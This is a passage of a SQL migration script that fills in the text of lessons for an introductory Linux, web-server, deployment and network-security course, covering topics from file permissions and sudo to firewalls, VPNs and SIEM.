8. User Environment: The /etc/profile and /etc/profile.d/ files set system-wide environment variables. The ~/.bashrc and ~/.bash_profile files set user-specific variables. Understanding user environment configuration is essential for consistent behavior.', "order" = 1 WHERE "sectionId" = '76de84fc-6334-41b4-8149-55a05ea95912' AND title = 'User and Group Management';
UPDATE "Lesson" SET content = 'File permissions are a fundamental security mechanism in Linux that controls who can read, write, and execute files and directories.

1. Permission Structure: Every file and directory has three sets of permissions: owner, group, and others. Each set contains three permissions: read (r), write (w), and execute (x). For files, read allows viewing contents, write allows modifying, and execute allows running as a program. For directories, read allows listing, write allows creating/deleting, and execute allows entering the directory.

2. Viewing Permissions: The ls -l command displays permissions. The format is: type + owner permissions + group permissions + other permissions. For example, -rwxr-xr-- indicates a regular file with full owner permissions, read/execute for group, and read-only for others.

3. Changing Permissions with chmod: Use symbolic mode: chmod u+x filename (add execute for owner), chmod g-w filename (remove write for group). Use octal mode: chmod 755 filename (owner: rwx, group: r-x, others: r-x). Octal values: r=4, w=2, x=1, none=0.

4. Special Permissions: The setuid bit (4000) allows a file to run with the owner''s permissions (chmod u+s). The setgid bit (2000) allows a file to run with the group''s permissions and on directories, new files inherit the directory''s group. The sticky bit (1000) on directories prevents users from deleting files they don''t own.

5. Ownership Management: The chown command changes file ownership (chown user:group filename). Use chown -R user:group directory for recursive changes. The chgrp command changes group ownership.

6. Access Control Lists (ACL): ACLs provide more granular permission control. Use getfacl filename to view ACLs and setfacl to modify them. For example, setfacl -m u:user:rwx filename grants specific permissions.

7. Permission Security Implications: Improper permissions can lead to security vulnerabilities. World-writable files can be modified by anyone. SUID files run with elevated privileges. World-executable files can be run by anyone. Understanding these implications is essential for security.

8. Best Practices: Use the principle of least privilege. Avoid world-writable files in sensitive directories. Audit SUID and SGID files regularly. Use groups to manage permissions. Implement umask for default permissions.', "order" = 2 WHERE "sectionId" = '76de84fc-6334-41b4-8149-55a05ea95912' AND title = 'File Permissions Deep Dive';
UPDATE "Lesson" SET content = 'sudo (superuser do) is a program that allows users to run commands with the privileges of another user, typically root. It is the primary mechanism for privilege escalation in Linux.

1. sudo Basics: The basic syntax is sudo command. By default, sudo prompts for the user''s own password. The sudo command checks /etc/sudoers to determine authorization. Use sudo -i for an interactive root shell, sudo -s for a shell with root privileges, and sudo -u user command to run as another user.

2. sudoers Configuration: The /etc/sudoers file defines sudo access. Use visudo to edit safely (syntax checking). The format is: user host=(runas) commands. For example: username ALL=(ALL:ALL) ALL grants full sudo access.

3. sudoers Syntax: admin ALL=(ALL) ALL allows admin to run any command. admin ALL=(ALL) NOPASSWD: ALL allows passwordless sudo. admin ALL=(ALL) /usr/bin/systemctl allows only systemctl commands. Use Cmnd_Alias for command groups.

4. Security Considerations: Limit sudo access to users who need it. Use command restrictions to limit which commands can be run. Implement logging. Use NOPASSWD sparingly. Regularly review sudo access.

5. Logging and Auditing: sudo logs all commands to /var/log/auth.log (Debian/Ubuntu) or /var/log/secure (CentOS/RHEL). The log provides an audit trail of all privilege escalation activities.

6. Common Sudo Patterns: Granting full access (username ALL=(ALL) ALL), allowing specific commands (%admin ALL=(ALL) /usr/bin/apt), passwordless sudo for specific commands, and using command aliases for grouping.

7. Privilege Escalation Vectors: Beyond sudo, Linux provides other escalation mechanisms. The su command switches user context. The setuid bit on executables allows running with owner''s privileges. The capabilities system provides fine-grained privilege management.

8. Security Hardening: Use requiretty to prevent sudo in scripts. Implement time-limited sudo with timestamp_timeout. Use !root to prevent users from becoming root. Implement sudo plugins for advanced logging. Regularly audit sudo configuration.', "order" = 3 WHERE "sectionId" = '76de84fc-6334-41b4-8149-55a05ea95912' AND title = 'sudo and Privilege Escalation';
UPDATE "Lesson" SET content = 'Bash scripting is the process of writing programs using the Bash shell, the default command-line interpreter on most Linux systems. Shell scripts automate repetitive tasks and combine commands into complex workflows.

1. Script Structure: A Bash script begins with a shebang line: #!/bin/bash. The script contains commands executed sequentially. Use comments (#) to document your code. Scripts are executed by making them executable (chmod +x script.sh) and running them (./script.sh).

2. Variables: Define variables without spaces: NAME=value. Access variables with $NAME or ${NAME}. Use readonly to make variables immutable. Use local for function variables. Special variables include $0 (script name), $1-$9 (arguments), $# (argument count), $@ (all arguments), and $? (exit status).

3. User Input: The read command captures input (read -p ''Enter name: '' NAME). Use read -s for silent input. Use read -t 10 for timeout. Pass arguments as command-line arguments ($1, $2, etc.).

4. Conditional Statements: Use if/else for conditional execution. The syntax is: if [ condition ]; then commands; elif [ condition ]; then commands; else commands; fi. Common tests: -f file, -d directory, -r file, -w file, -x file, -z string, -n string.

5. Loops: The for loop iterates over a list: for i in 1 2 3; do echo $i; done. The while loop continues while true: while [ condition ]; do commands; done. The until loop continues until true: until [ condition ]; do commands; done. Use break to exit and continue to skip.

6. Functions: Define functions with function name { commands; } or name() { commands; }. Call functions by name. Access arguments with $1, $2, etc. Use local for function variables. Functions can return values using return or echo.

7. Command Substitution: Capture command output using $(command) syntax: FILES=$(ls). Use backticks for older syntax. Command substitution is essential for incorporating dynamic data into scripts.

8. Error Handling: Check exit codes after commands (if [ $? -ne 0 ]; then echo ''Error''; fi). Use set -e to exit on errors. Use set -u to treat unset variables as errors. Use trap to handle signals and cleanup.', "order" = 1 WHERE "sectionId" = 'c6827943-9077-4b7f-94bd-e1a5b8d5305c' AND title = 'Bash Scripting Fundamentals';
UPDATE "Lesson" SET content = 'sed (stream editor) and awk are powerful text processing tools available on all Unix-like systems. They are essential for data extraction, transformation, and reporting.

1. sed Fundamentals: sed reads input line by line and applies editing commands. The basic syntax is: sed ''command'' file. Use -e for multiple commands, -i for in-place editing, and -n to suppress default output.

2. sed Commands: The s command substitutes text: sed ''s/old/new/'' file replaces first occurrence per line. Use s/old/new/g for global replacement. The d command deletes lines: sed ''/pattern/d'' file. The p command prints matching lines. The a command appends text, i inserts before, and c replaces entire lines.

3. sed Addressing: sed addresses target specific lines. Use line numbers: sed ''5d'' file deletes line 5. Use ranges: sed ''3,7d'' file deletes lines 3 through 7. Use patterns: sed ''/start/,/end/d'' file. Use $ for the last line.

4. awk Fundamentals: awk processes text by splitting lines into fields. The basic syntax is: awk ''pattern { action }'' file. By default, awk splits on whitespace. Use -F to specify field separator: awk -F: ''{ print $1 }'' /etc/passwd.

5. awk Built-in Variables: $0 is the entire line. $1, $2, etc. are individual fields. NF is the number of fields. NR is the current line number. FS is the field separator. OFS is the output field separator.

6. awk Patterns: Use regular expressions: awk ''/pattern/ { print }''. Use comparison operators: awk ''$3 > 100 { print }''. Use BEGIN and END blocks for initialization and cleanup.

7. Advanced awk Techniques: awk supports arrays, functions, and control structures. Arrays are associative: awk ''{ count[$1]++ } END { for (key in count) print key, count[key] }''. Use printf for formatted output.

8. Combining sed and awk: Use sed for simple text transformations and awk for field-based processing. For example: sed ''s/,/\t/g'' file | awk ''{ print $2 }'' converts CSV to tab-delimited and extracts a field.', "order" = 2 WHERE "sectionId" = 'c6827943-9077-4b7f-94bd-e1a5b8d5305c' AND title = 'Text Processing with sed and awk';
UPDATE "Lesson" SET content = 'Regular expressions (regex) are patterns used to match and manipulate text. They are a powerful tool for text processing, data validation, and search operations.

1. Basic Regular Expression Syntax: The most basic pattern is a literal string. Special characters include . (any character), * (zero or more), + (one or more), ? (zero or one), ^ (start of line), $ (end of line), and [] (character classes).

2. Character Classes: [abc] matches any of a, b, or c. [a-z] matches any lowercase letter. [A-Z] matches any uppercase letter. [0-9] matches any digit. [^abc] matches any character not in the set. [[:alpha:]] matches any letter.

3. Quantifiers: * matches zero or more times. + matches one or more times. ? matches zero or one time. {n} matches exactly n times. {n,} matches n or more times. {n,m} matches between n and m times.

4. Anchors: ^ matches the start of a line. $ matches the end of a line. \b matches a word boundary. These are essential for precise pattern matching.

5. Groups and Alternation: (abc) captures the group abc. (a|b) matches either a or b. (ab)+ matches one or more occurrences of ab. Groups are numbered from left to right starting at 1.

6. Escape Sequences: \n matches a newline. \t matches a tab. \. matches a literal dot. \\ matches a literal backslash. \d matches any digit. \w matches any word character. \s matches any whitespace.

7. Practical Examples: Validate email addresses: ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$. Match IP addresses: ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$. Extract dates: [0-9]{1,2}/[0-9]{1,2}/[0-9]{4}.

8. Testing and Debugging: Use grep -E for extended regex. Use sed -E for extended regex in sed. Start with simple patterns and build complexity gradually. Test patterns against various inputs.', "order" = 3 WHERE "sectionId" = 'c6827943-9077-4b7f-94bd-e1a5b8d5305c' AND title = 'Regular Expressions';
UPDATE "Lesson" SET content = 'Nginx is a high-performance web server and reverse proxy known for its exceptional concurrency, low memory usage, and event-driven architecture. It has become one of the most popular web servers globally.

1. Architecture Overview: Nginx uses an event-driven, asynchronous architecture. The master process manages worker processes, each handling multiple connections concurrently using non-blocking I/O. This allows Nginx to handle thousands of simultaneous connections with minimal resource usage.

2. Configuration File Structure: The main configuration file is typically /etc/nginx/nginx.conf. It contains main, events, http, server, and location contexts. Configuration blocks are nested and inherit settings from parent contexts. Use include directives to split configuration.

3. Main Context: Contains global settings. Use worker_processes to specify the number of workers (auto detects CPU cores). Use worker_rlimit_nofile to set maximum open files per worker. Use error_log for global error logging.

4. Events Context: Defines how Nginx handles connections. Use worker_connections for maximum connections per worker. Use use to specify the connection processing method (epoll on Linux). Use multi_accept to allow workers to accept multiple connections.

5. HTTP Context: Contains all HTTP server configuration. Use include to use MIME types. Use sendfile for zero-copy file transfer. Use tcp_nopush and tcp_nodelay for TCP optimization. Use keepalive_timeout for persistent connections.

6. Server Context: Server blocks define virtual hosts. Use listen for port and address. Use server_name to match domains. Use root for document root. Use index for index files.

7. Location Context: Location blocks define URL processing. Use exact matching (=), prefix matching (^~), regular expression (~ and ~*), and general prefix matching. Location blocks are evaluated in a specific order.

8. Performance Tuning: Use worker_processes auto. Use worker_connections for concurrent connections. Use keepalive for persistent connections. Use gzip compression. Use open_file_cache for file metadata caching.', "order" = 1 WHERE "sectionId" = '9e518831-5103-4e4a-9944-6deefdc7465f' AND title = 'Nginx Architecture and Configuration';
UPDATE "Lesson" SET content = 'Nginx excels as a reverse proxy and load balancer, distributing client requests across multiple backend servers.

1. Reverse Proxy Basics: Configure using proxy_pass: location / { proxy_pass http://backend; }. The proxy_pass directive specifies the backend server or group.

2. Proxy Headers: Use proxy_set_header to pass headers: proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme;.

3. Load Balancing Methods: Round-robin distributes requests sequentially. Least-conn sends to the server with fewest connections. IP-hash uses client IP for consistent routing. Weighted round-robin assigns different weights.

4. Upstream Configuration: Define backend server groups: upstream backend { server server1.example.com; server server2.example.com; }. Use server directive with options: weight, max_fails, fail_timeout.

5. Health Checks: Nginx monitors backend health using passive checks. If a server fails, it''s marked unavailable. Use max_fails and fail_timeout to configure behavior.

6. Sticky Sessions: Use ip_hash for IP-based sessions. Use sticky cookie (Nginx Plus) for cookie-based sessions. Sticky sessions are essential for stateful applications.

7. Load Balancing Example: upstream backend { least_conn; server backend1.example.com weight=3; server backend2.example.com weight=2; server backend3.example.com backup; }.

8. Security Considerations: Use HTTPS for client-facing connections. Implement proper proxy headers. Use rate limiting. Implement access controls. Use security headers.', "order" = 2 WHERE "sectionId" = '9e518831-5103-4e4a-9944-6deefdc7465f' AND title = 'Reverse Proxy and Load Balancing';
UPDATE "Lesson" SET content = 'SSL/TLS configuration is essential for securing web traffic and protecting data in transit.

1. SSL Certificate Installation: Obtain certificates from CAs. Store in /etc/ssl/certs/ and /etc/ssl/private/. Configure: ssl_certificate /etc/ssl/certs/your_domain.crt; ssl_certificate_key /etc/ssl/private/your_domain.key;. Restrict key permissions (chmod 600).

2. SSL Configuration Blocks: Create dedicated SSL server blocks. Configure ssl_session_cache shared:SSL:10m; ssl_session_timeout 10m;.

3. Protocol and Cipher Configuration: Use ssl_protocols TLSv1.2 TLSv1.3; Use ssl_ciphers with strong cipher suites. Disable weak protocols like SSLv3 and TLSv1.0.

4. HTTP/2 Configuration: Enable with listen 443 ssl http2;. HTTP/2 requires SSL/TLS and provides multiplexing, header compression, and server push.

5. OCSP Stapling: Enable with ssl_stapling on; ssl_stapling_verify on;. Configure the OC responder with ssl_trusted_certificate.

6. HSTS Configuration: Enable with add_header Strict-Transport-Security ''max-age=31536000; includeSubDomains; preload'' always;.

7. Certificate Management: Use Let''s Encrypt for free, automated certificates. Configure certbot for automatic renewal. Monitor certificate expiration.

8. Security Testing: Test with SSL Labs (ssllabs.com/ssltest). Use openssl s_client for manual testing. Check for vulnerabilities. Verify certificate chain completeness.', "order" = 3 WHERE "sectionId" = '9e518831-5103-4e4a-9944-6deefdc7465f' AND title = 'SSL/TLS Configuration';
UPDATE "Lesson" SET content = 'Apache HTTP Server is one of the most widely used web servers, known for its flexibility, extensibility, and comprehensive feature set.

1. Configuration File Structure: Apache uses a hierarchical configuration. The main file is httpd.conf (CentOS/RHEL) or apache2.conf (Debian/Ubuntu). Site-specific configs are in sites-available/ and sites-enabled/.

2. Directives and Sections: Directives set configuration values. Sections group directives: <VirtualHost>, <Directory>, <Location>, <Files>. Sections can be nested and use opening and closing tags.

3. Virtual Hosts: Serve multiple websites from one server. Define with <VirtualHost *:80> ServerName example.com DocumentRoot /var/www/example.com </VirtualHost>. Each virtual host can have its own configuration.

4. Directory Configuration: The <Directory> section controls access for specific paths. Use Options to enable features. Use AllowOverride for .htaccess files. Use Require to control access.

5. Module Configuration: Load modules with LoadModule: LoadModule rewrite_module modules/mod_rewrite.so. Configure with <IfModule> sections. Common modules: mod_rewrite, mod_ssl, mod_proxy, mod_security.

6. Logging Configuration: Configure access logs with CustomLog. Configure errors with ErrorLog. Use different formats for different purposes.

7. Performance Settings: Use KeepAlive for persistent connections. Set KeepAliveTimeout and MaxKeepAliveRequests. Configure StartServers and MaxServers. Use mod_deflate for compression.

8. Testing and Validation: Use apachectl configtest to verify syntax. Use apachectl graceful to apply changes. Check error logs for issues.', "order" = 1 WHERE "sectionId" = '70027b0b-5833-4a93-80a1-b6ef042bfcc7' AND title = 'Apache Configuration Basics';
UPDATE "Lesson" SET content = 'Apache security hardening involves configuring the web server to resist attacks and protect sensitive data.

1. Version and Module Security: Use ServerTokens Prod to minimize server header information. Use ServerSignature Off to remove server information. Disable unnecessary modules.

2. File System Permissions: Run Apache as a dedicated user (www-data, apache). Set appropriate permissions on document root directories. Use separate user and group for Apache processes.

3. Directory Security: Disable directory listing with Options -Indexes. Use Options -FollowSymLinks. Use Options -Includes. Implement .htaccess restrictions with AllowOverride None.

4. Access Control: Use Require to control access by IP, user, or criteria. Implement authentication for administrative areas. Use IP-based restrictions for sensitive directories.

5. SSL/TLS Hardening: Use strong cipher suites. Enable HSTS. Use OCSP stapling. Configure SSL session caching.

6. HTTP Security Headers: Use X-Frame-Options to prevent clickjacking. Use X-Content-Type-Options to prevent MIME sniffing. Use Content-Security-Policy.

7. Request Filtering: Use mod_security as a WAF. Implement request size limits with LimitRequestBody. Use mod_rewrite to block suspicious URLs.

8. Logging and Monitoring: Log all access attempts and errors. Implement real-time monitoring. Regularly review logs for suspicious activity.', "order" = 2 WHERE "sectionId" = '70027b0b-5833-4a93-80a1-b6ef042bfcc7' AND title = 'Security Hardening';
UPDATE "Lesson" SET content = 'Apache performance tuning involves optimizing configuration to maximize throughput and minimize response times.

1. Process Management: Apache uses different MPMs. The prefork MPM uses one process per connection. Worker and event MPMs use threads. Configure StartServers, MaxRequestWorkers, and ThreadsPerChild.

2. KeepAlive Configuration: Enable KeepAlive for persistent connections. Set KeepAliveTimeout (5-15 seconds). Set MaxKeepAliveRequests (100-500).

3. Compression: Enable with mod_deflate. Configure for text/html, CSS, JavaScript, JSON. Set compression levels to balance CPU usage.

4. Caching: Use mod_cache for content caching. Use mod_expires for browser caching. Configure reverse proxy caching.

5. Static Content Optimization: Use mod_expires for expiration headers. Enable sendfile. Configure MIME types. Use content negotiation.

6. Database Connection Optimization: Use persistent connections. Configure connection limits. Implement query caching.

7. Memory Management: Configure MaxRequestWorkers based on available memory. Use appropriate KeepAlive settings. Implement graceful shutdown.

8. Monitoring and Benchmarking: Use mod_status for real-time statistics. Use ab or wrk for load testing. Implement APM tools. Monitor response times and throughput.', "order" = 3 WHERE "sectionId" = '70027b0b-5833-4a93-80a1-b6ef042bfcc7' AND title = 'Performance Tuning';
UPDATE "Lesson" SET content = 'Deploying Node.js applications requires careful consideration of process management, environment configuration, security, and performance.

1. Environment Preparation: Set up with appropriate Node.js version. Use nvm or package managers. Configure environment variables (NODE_ENV=production). Disable development features. Use PM2 or systemd for process management.

2. Package Management: Use npm or yarn. Run npm install --production. Use package-lock.json for consistent versions. Use npm audit for security.

3. Process Management: Use PM2 for clustering, logs, and auto-restart: pm2 start app.js -i max. Use systemd for system-level management. Configure restart policies and health checks.

4. Reverse Proxy Configuration: Deploy behind Nginx or Apache. Configure proxy_pass. Set proxy headers. Enable SSL/TLS termination.

5. Environment Configuration: Use environment-specific files. Use dotenv for local development. Never commit sensitive config. Use secrets management tools for production.

6. Logging and Monitoring: Configure structured logging. Use Winston or Pino. Implement log rotation. Set up APM tools for performance monitoring.

7. Security Hardening: Use HTTPS. Implement rate limiting. Use helmet.js for HTTP security headers. Implement input validation.

8. Deployment Automation: Use CI/CD pipelines. Implement blue-green or rolling deployments. Use infrastructure as code. Document deployment procedures.', "order" = 1 WHERE "sectionId" = 'bae07d17-4da6-4a9c-9a6f-d911ed8a0c52' AND title = 'Deploying Node.js Applications';
UPDATE "Lesson" SET content = 'Containerized deployment using Docker provides consistent, reproducible, and scalable deployment environments.

1. Docker Fundamentals: Containers are lightweight, isolated environments. Containers share the host OS kernel but have their own filesystem, network, and process space. Use images as templates, Dockerfiles for build process.

2. Dockerfile Best Practices: Use multi-stage builds. Minimize layers. Use specific base image tags. Order layers by change frequency. Use .dockerignore. Run as non-root users.

3. Image Optimization: Use Alpine Linux base images. Remove unnecessary packages. Use multi-stage builds. Implement image scanning for vulnerabilities.

4. Container Networking: Use bridge networks for internal communication. Use host networking for performance. Configure port mapping. Use Docker networks for service discovery.

5. Volume Management: Use named volumes for persistent data. Use bind mounts for development. Backup volumes regularly. Monitor volume usage.

6. Container Security: Run as non-root users. Use read-only filesystems. Limit resources. Implement security scanning. Use Docker Content Trust.

7. Container Orchestration: Use Docker Compose or Kubernetes. Docker Compose defines multi-container apps. Kubernetes provides advanced orchestration.

8. Production Deployment: Use container registries. Implement CI/CD. Use blue-green or rolling deployments. Monitor health and performance.', "order" = 2 WHERE "sectionId" = 'bae07d17-4da6-4a9c-9a6f-d911ed8a0c52' AND title = 'Containerized Deployment';
UPDATE "Lesson" SET content = 'Zero-downtime deployments ensure users can access your application continuously during updates.

1. Blue-Green Deployment: Maintain two identical production environments. One serves traffic while the other is updated. Switch traffic using load balancers or DNS. Provides instant rollback.

2. Rolling Deployment: Gradually update instances across infrastructure. Update a subset, verify, then update the next. Maintain availability throughout.

3. Canary Deployment: Release changes to a small percentage of users. Monitor for errors and performance. Gradually increase traffic while monitoring.

4. Session Management: Use external session storage (Redis, database). Implement session persistence. Consider stateless authentication with JWT tokens.

5. Database Migrations: Use backward-compatible migrations. Implement feature flags. Use expand-contract pattern. Test thoroughly.

6. Load Balancer Configuration: Implement health checks. Configure graceful shutdown. Use connection draining.

7. Monitoring and Rollback: Implement comprehensive monitoring. Use automated rollback triggers. Test rollback procedures regularly.

8. Deployment Automation: Use CI/CD pipelines. Implement deployment scripts. Use infrastructure as code. Document procedures.', "order" = 3 WHERE "sectionId" = 'bae07d17-4da6-4a9c-9a6f-d911ed8a0c52' AND title = 'Zero-Downtime Deployments';
UPDATE "Lesson" SET content = 'The OSI model and TCP/IP model are conceptual frameworks that describe how network communication works.

1. OSI Model Overview: The OSI model divides communication into seven layers: Physical (Layer 1), Data Link (Layer 2), Network (Layer 3), Transport (Layer 4), Session (Layer 5), Presentation (Layer 6), and Application (Layer 7).

2. Physical Layer (Layer 1): Handles raw bit transmission over physical media. Defines electrical signals, cable types, connector pinouts, and data rates. Examples: Ethernet cables, fiber optics, Wi-Fi.

3. Data Link Layer (Layer 2): Provides node-to-node data transfer. Uses MAC addresses for device identification. Examples: Ethernet (802.3), Wi-Fi (802.11), switches.

4. Network Layer (Layer 3): Handles packet forwarding and routing. Uses IP addresses for logical addressing. Examples: IPv4, IPv6, ICMP, routers.

5. Transport Layer (Layer 4): Provides end-to-end communication. Handles segmentation, flow control, and error recovery. Examples: TCP (reliable, connection-oriented) and UDP (unreliable, connectionless).

6. Session Layer (Layer 5): Establishes, manages, and terminates connections between applications. Examples: NetBIOS, RPC, PPTP.

7. Presentation Layer (Layer 6): Handles data translation, encryption, and compression. Examples: SSL/TLS, JPEG, ASCII.

8. Application Layer (Layer 7): Provides network services to applications. Examples: HTTP/HTTPS, SMTP, FTP, DNS.', "order" = 1 WHERE "sectionId" = 'b8d8d69a-db1a-4222-87d4-1b5d3fec9dcf' AND title = 'OSI Model and TCP/IP';
UPDATE "Lesson" SET content = 'Subnetting and CIDR are fundamental concepts in IP networking that enable efficient address allocation and network segmentation.

1. IP Address Basics: An IP address is a 32-bit number divided into four octets (192.168.1.1). Each octet represents 8 bits (0-255). IP addresses consist of a network portion and a host portion.

2. Subnet Masks: A subnet mask identifies the network portion. Common masks: 255.0.0.0 (/8), 255.255.0.0 (/16), 255.255.255.0 (/24).

3. CIDR Notation: Represents subnet masks as prefix length. For example, 192.168.1.0/24 indicates 24 network bits and 8 host bits. CIDR allows flexible subnet masking.

4. Subnetting Calculations: Borrowed bits create subnets (2^n). Host bits provide addresses (2^h - 2). For example, borrowing 2 bits from /24 creates 4 subnets with 62 hosts each.

5. Private IP Ranges: Class A: 10.0.0.0/8. Class B: 172.16.0.0/12. Class C: 192.168.0.0/16. These are not routable on the public internet.

6. Supernetting: Combines multiple networks into aggregate routes. Reduces routing table size. Essential for internet routing scalability.

7. Variable Length Subnet Masking (VLSM): Allows different subnets to have different masks. Enables efficient address allocation by matching subnet size to requirements.

8. Best Practices: Document allocations. Leave room for growth. Use consistent schemes. Implement for security segmentation. Monitor utilization.', "order" = 2 WHERE "sectionId" = 'b8d8d69a-db1a-4222-87d4-1b5d3fec9dcf' AND title = 'Subnetting and CIDR';
UPDATE "Lesson" SET content = 'DNS is the hierarchical, distributed naming system that translates domain names to IP addresses.

1. DNS Architecture: Hierarchical structure with root servers, TLD servers (.com, .org), authoritative name servers, and recursive resolvers.

2. DNS Record Types: A records (IPv4), AAAA records (IPv6), CNAME records (aliases), MX records (mail servers), NS records (name servers), TXT records (SPF, DKIM), SOA records.

3. DNS Resolution Process: Client checks local cache, queries recursive resolver, resolver queries root servers, TLD servers, and authoritative servers. Response is cached at each level.

4. DNS Caching: Clients cache based on TTL values. Recursive resolvers cache all queries. Cache poisoning attacks exploit caching.

5. DNS Configuration: Set DNS servers. Configure search domains. Implement split-horizon DNS. Use DNS for load balancing.

6. DNS Security: DNSSEC provides authentication. DNS over HTTPS (DoH) and DNS over TLS (DoT) encrypt queries. Use DNS firewalls.

7. DNS Troubleshooting: Use dig, nslookup, and host tools. Check resolution, verify authoritative servers, test MX records.

8. Best Practices: Use multiple authoritative servers. Set appropriate TTLs. Implement DNSSEC. Use DNS logging. Regular audits.', "order" = 3 WHERE "sectionId" = 'b8d8d69a-db1a-4222-87d4-1b5d3fec9dcf' AND title = 'DNS and Name Resolution';
UPDATE "Lesson" SET content = 'Firewalls monitor and filter network traffic based on security rules. They are the first line of defense in network security.

1. Packet Filtering Firewalls: Examine individual packets based on header information (source/destination IP, port, protocol). Operate at Layer 3 and Layer 4. Fast but limited.

2. Stateful Inspection Firewalls: Maintain a state table tracking active connections. Make decisions based on connection state. Better security than packet filtering.

3. Application Layer Firewalls: Operate at Layer 7, inspecting application-specific protocols. Deep packet inspection and content filtering but may impact performance.

4. Next-Generation Firewalls (NGFW): Combine traditional capabilities with intrusion prevention, application control, and threat intelligence. Provide deep packet inspection and SSL/TLS inspection.

5. Cloud-Based Firewalls: Provide firewall capabilities as a cloud service. Scale automatically, require no hardware. Ideal for distributed networks.

6. iptables Configuration: Configure using filter table (INPUT, FORWARD, OUTPUT chains). Use -A to append rules, -I to insert, -D to delete. Specify protocols with -p, ports with --dport.

7. Rule Best Practices: Default deny policy. Document all rules. Order by specificity. Regularly audit. Remove obsolete rules. Log denied traffic. Test thoroughly.

8. Monitoring and Management: Monitor logs for suspicious activity. Implement change management. Regular audits and compliance checks. Performance monitoring. Backup configurations.', "order" = 1 WHERE "sectionId" = '16b83718-c1c5-4e49-b36c-27f6494ba6ea' AND title = 'Firewall Types and Configuration';
UPDATE "Lesson" SET content = 'VPNs create encrypted tunnels over public networks, enabling secure remote access and site-to-site connectivity.

1. VPN Types: Remote access VPNs connect individual users. Site-to-site VPNs connect entire networks. SSL VPNs use web browsers. IPsec VPNs provide network-layer encryption.

2. IPsec VPN: Provides network-layer encryption and authentication. Operates in transport mode (payload only) or tunnel mode (entire packet). Widely used for site-to-site VPNs.

3. SSL/TLS VPN: Uses SSL/TLS encryption for remote access. Easier to deploy than IPsec. Supports split tunneling. OpenVPN is a popular open-source solution.

4. WireGuard VPN: Modern protocol emphasizing simplicity and performance. Smaller codebase, faster connections. Gaining popularity as a replacement for older protocols.

5. Security Considerations: Use strong encryption (AES-256). Implement perfect forward secrecy (PFS). Use multi-factor authentication. Monitor connections.

6. Split Tunneling: Allows VPN users to access both corporate and internet resources. Reduces bandwidth but may create security risks. Full tunneling routes all traffic through VPN.

7. Configuration Best Practices: Use strong authentication. Implement least privilege. Monitor logs. Regular audits. Update software. Document configurations.

8. Deployment: Choose appropriate protocol. Implement redundancy. Configure load balancing. Monitor performance. Implement backup connections.', "order" = 2 WHERE "sectionId" = '16b83718-c1c5-4e49-b36c-27f6494ba6ea' AND title = 'VPN Technologies';
UPDATE "Lesson" SET content = 'NAT translates private IP addresses to public IP addresses, enabling multiple devices to share a single public IP.

1. NAT Fundamentals: Operates by modifying IP addresses in packet headers. Private addresses (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) are translated to public addresses.

2. Static NAT: One-to-one mapping between private and public addresses. Each private address is permanently mapped to a specific public address. Useful for servers needing consistent public addresses.

3. Dynamic NAT: Maps private addresses to a pool of public addresses on first-come, first-served basis. Conserves addresses but doesn''t provide consistent public addresses.

4. PAT (Port Address Translation): Maps multiple private addresses to a single public address using different port numbers. Most common NAT implementation. Allows thousands of devices to share one public IP.

5. NAT Configuration: On Cisco routers: ip nat inside source static for static NAT, ip nat inside source list for dynamic NAT, and ip nat inside source list interface overload for PAT.

6. Security Considerations: NAT provides security by hiding internal structure. However, NAT is not a replacement for firewalls. IPsec and some VPN protocols require NAT traversal.

7. NAT and Application Protocols: Some protocols don''t work well with NAT. FTP, SIP, H.323 require ALG support. Configure ALGs appropriately.

8. Best Practices: Document configurations. Use logging. Implement security controls alongside NAT. Monitor translation tables. Consider IPv6 deployment.', "order" = 3 WHERE "sectionId" = '16b83718-c1c5-4e49-b36c-27f6494ba6ea' AND title = 'Network Address Translation';
UPDATE "Lesson" SET content = 'IDS monitor network traffic and system activities for signs of malicious behavior. They are essential for defense-in-depth security.

1. IDS Types: Network-based IDS (NIDS) monitors network traffic. Host-based IDS (HIDS) monitors individual systems. Wireless IDS (WIDS) monitors wireless networks. Most environments use multiple types.

2. Signature-Based Detection: Compares traffic against known attack patterns. Effective for known attacks but cannot identify new attacks. Signature databases must be updated regularly.

3. Anomaly-Based Detection: Establishes baseline behavior and alerts on deviations. Can detect zero-day attacks but may produce more false positives. Machine learning improves accuracy.

4. Stateful Protocol Analysis: Compares events against predetermined protocol profiles. Understands protocol semantics. More sophisticated than signature-based detection.

5. IDS Deployment: Place sensors at network boundaries and internal segments. Use port mirroring or network taps. Consider topology when planning deployment.

6. IDS Configuration: Configure rules and policies. Tune to reduce false positives. Configure alert thresholds. Implement whitelisting. Regular updates.

7. IDS Response Actions: Passive IDS generates alerts. Active IDS (IPS) can automatically block threats. Configure based on severity and confidence. Balance automatic response with business continuity.

8. Monitoring and Maintenance: Continuously monitor performance. Review alerts. Update signatures. Tune configuration. Integrate with SIEM. Regular effectiveness testing.', "order" = 1 WHERE "sectionId" = 'c5f841ba-1cbc-4bc1-b796-fb446a705264' AND title = 'Intrusion Detection Systems';
UPDATE "Lesson" SET content = 'Log management and SIEM are critical for security monitoring, incident response, and compliance.

1. Log Sources: Collect from system logs, application logs, security logs (firewall, IDS), network logs (NetFlow, DNS), authentication logs, database logs, and cloud service logs.

2. Log Collection: Implement centralized collection. Use syslog for Linux. Use log forwarders for Windows. Use API-based collection for cloud services. Ensure collection doesn''t impact performance.

3. Log Storage and Retention: Define retention policies based on compliance requirements. Store in secure, tamper-evident storage. Implement log rotation. Use WORM storage for compliance.

4. Log Parsing and Normalization: Parse and normalize logs for consistent analysis. Extract key fields. Normalize field names across sources. Use structured logging formats.

5. SIEM Architecture: Aggregate and analyze log data. Includes collectors, parsers, correlation engines, and dashboards. Provides real-time monitoring and reporting.

6. SIEM Correlation and Analysis: Correlation rules identify security events by analyzing relationships between sources. Detect multi-stage attacks and insider threats.

7. SIEM Alerting and Response: Configure alerts for security events. Define thresholds based on severity. Implement escalation procedures. Integrate with incident response.

8. Best Practices: Start with critical sources. Tune rules regularly. Document correlation rules. Integrate with threat intelligence. Regular effectiveness testing.', "order" = 2 WHERE "sectionId" = 'c5f841ba-1cbc-4bc1-b796-fb446a705264' AND title = 'Log Management and SIEM';
